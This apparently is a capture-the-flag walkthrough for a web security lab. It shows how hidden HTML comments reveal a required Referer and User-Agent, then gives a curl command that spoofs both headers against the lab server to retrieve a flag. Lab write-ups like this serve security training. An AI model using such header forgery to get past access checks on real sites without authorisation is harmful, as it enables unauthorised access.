## 1
go to 
http::/{ip}/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
There will be an albatross picture. Inspect it (F12). Find the long comment
<!-- You must cumming from : "https://www.nsa.gov/" to go to the next step -->
<!-- Let's use this browser : "ft_bornToSec". It will help you a lot. -->
These comments indicate the server expects a Referer of https://www.nsa.gov/ and a User-Agent of ft_bornToSec
## 2
use curl to create a new html

curl -s http://10.39.42.166/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f -H "Referer: https://www.nsa.gov/" -H "User-Agent: ft_bornToSec" -o ftbts.html

open the ftbts.html, the flag is inside